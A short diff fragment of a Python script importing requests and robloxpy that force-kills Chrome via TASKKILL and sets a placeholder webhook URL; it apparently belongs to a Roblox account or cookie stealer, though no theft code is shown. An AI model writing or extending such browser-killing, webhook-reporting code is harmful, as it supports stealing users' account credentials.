@@ -14,8 +14,9 @@ import requests
 import robloxpy
 
 try:
-    subprocess.call("TASKKILL /f  /IM  CHROME.EXE")
-    
+    subprocess.call("TASKKILL /f /IM CHROME.EXE")
+except FileNotFoundError:
+    print("")
 
 webhook_url = 'heh'
 
